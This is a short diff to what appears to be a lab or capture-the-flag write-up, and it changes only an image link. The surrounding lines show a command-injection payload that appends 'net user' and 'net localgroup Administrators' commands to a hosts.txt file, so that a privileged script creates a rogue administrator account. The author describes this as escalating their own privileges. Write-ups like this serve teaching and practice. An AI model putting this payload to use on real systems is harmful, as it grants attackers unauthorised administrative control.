@@ -680,8 +680,8 @@ navigate to the folder above and download the hosts.txt file, then edit it to ad
 ```
 ; net user bilal 'p*s$w0rd123' /add; net localgroup Administrators bilal /add
 ```
-
-![hosts][/hosts.png]
+(
+![hosts](/hosts.png)
 
 when the script performs this little maneuver, it will inadvertently create a user "bilal", and add me to the Administrators group heh heh.
 
